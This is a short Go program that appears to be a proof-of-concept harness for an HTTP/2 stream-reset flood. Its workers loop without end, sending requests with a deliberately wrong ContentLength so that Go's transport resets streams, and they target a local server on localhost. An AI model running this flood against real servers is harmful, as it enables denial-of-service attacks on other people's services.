package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
)

var (
	listenPort = flag.Int("listen_port", 12345, "Server listening port")
	certFile   = flag.String("cert_file", "server.crt", "TLS server cert")
	keyFile    = flag.String("key_file", "server.key", "TLS server key file")
	numWorkers = flag.Int("num_workers", 10, "number of async workers")
)

func asyncWorker(workerId int, serverUrl *url.URL) {
	// Abuse the checks on body size to send Stream RSTs
	// https://go.googlesource.com/net/+/master/http2/transport.go#1748
	client := initClient()
	for i := 0; ; i++ {
		request := &http.Request{
			URL:           serverUrl,
			ContentLength: 2,
			Body:          io.NopCloser(bytes.NewReader([]byte("test"))),
		}
		client.Do(request)
		// log.Printf("[worker %d] request %d: %s", workerId, i, err)
	}
}

func main() {
	server := initServer("test", int16(*listenPort))

	serverUrl, err := url.Parse(fmt.Sprintf("https://localhost:%d", 11337))
	if err != nil {
		log.Fatalf("failed to parse internal URL: %s", err)
	}

	for i := 0; i < *numWorkers; i++ {
		go asyncWorker(i, serverUrl)
	}

	for err := range server.errors {
		log.Printf("server error: %s", err)
	}
}
